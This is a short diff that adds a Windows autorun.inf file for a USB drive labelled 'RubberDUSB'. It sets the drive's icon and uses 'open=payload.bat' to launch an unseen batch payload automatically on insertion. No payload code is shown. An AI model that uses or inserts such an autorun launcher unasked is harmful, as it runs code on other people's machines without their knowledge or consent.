@@ -1,0 +1,7 @@
+[autorun]
+
+label=RubberDUSB
+
+icon=RubberDUSB.ico
+
+open=payload.bat
